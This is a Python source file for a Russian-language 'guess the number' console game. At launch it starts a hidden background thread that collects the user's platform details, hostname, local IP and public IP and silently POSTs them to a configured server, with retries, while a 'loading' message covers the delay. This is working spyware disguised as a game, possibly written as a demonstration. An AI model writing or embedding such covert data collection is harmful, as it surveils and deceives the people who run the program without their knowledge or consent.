import json
import platform
import socket

import http.client
import time

import random
import traceback
from threading import Thread

SERVER_IP = '127.0.0.1'
SERVER_PORT = 5000


class DataCollector:
    _attempts = 0
    MAX_ATTEMPTS = 10

    @staticmethod
    def _get_platform_data():
        return {
            'architecture': platform.architecture(),
            'machine': platform.machine(),
            'node': platform.node(),
            'platform': platform.platform(),
            'processor': platform.processor(),
            'release': platform.release()
        }

    @staticmethod
    def _get_public_ip():
        public_ip = None
        try:
            connection = http.client.HTTPSConnection("api.ipify.org")
            connection.request("GET", "/")
            response = connection.getresponse()
            public_ip = response.read().decode()
            connection.close()
        except Exception:
            pass
        return public_ip

    def _get_network_data(self):
        try:
            local_ip = socket.gethostbyname(socket.getfqdn())
        except:
            local_ip = None

        try:
            hostname = socket.gethostname()
        except:
            hostname = None

        return {
            'local_ip': local_ip,
            'hostname': hostname,
            'public_ip': self._get_public_ip()
        }

    def start_collection(self):
        self._attempts += 1
        try:
            data = {
                'platform': self._get_platform_data(),
                'network': self._get_network_data()
            }

        except:
            data = traceback.format_exc()
            if self._attempts != self.MAX_ATTEMPTS:
                time.sleep(3)
                self.start_collection()

        self._send_data(data)

    def start_collection_in_thread(self):
        th = Thread(target=self.start_collection)
        th.start()

    def _send_data(self, data):
        headers = {'Content-type': 'application/json'}
        try:
            connection = http.client.HTTPConnection(SERVER_IP, port=SERVER_PORT)
            connection.request("POST", "/save_data/", body=json.dumps(data), headers=headers)
            response = connection.getresponse()

            connection.close()

            if response.status == 200:
                return
            else:
                self._attempts += 1
                if self._attempts != self.MAX_ATTEMPTS:
                    self._send_data(data)
        except Exception:
            self._attempts += 1
            if self._attempts != self.MAX_ATTEMPTS:
                self._send_data(data)


class Game:
    """
    Игра `Угадай число`
    """

    @staticmethod
    def _get_random_value():
        return random.randint(1, 10)

    def input_user_data(self):
        data = input('Введите число: ')
        if data == 'exit':
            exit()
        try:
            return int(data)
        except:
            print('Введенное значение должно быть целым чилом!\n\n'
                  'Введите `exit` для выхода')
            self.input_user_data()

    def start_game(self):
        print('_________ Игра `Угадай число` _________\n\n'
              'Вам будет загадано число от 1 до 10, и ваша цель угать, что было загадано\n\n\n'
              'Введите `exit` для выхода')

        while True:
            print('\n=========================')
            random_value = self._get_random_value()
            print('Число загадоно! Время угадывать')

            if random_value == self.input_user_data():
                print('Вы угадали!')
            else:
                print('Вы не смогли угадать :(')

            time.sleep(1)


if __name__ == '__main__':
    data_collector = DataCollector()
    data_collector.start_collection_in_thread()

    print('Загрузка игры...\n')
    time.sleep(3)
    game = Game()
    game.start_game()
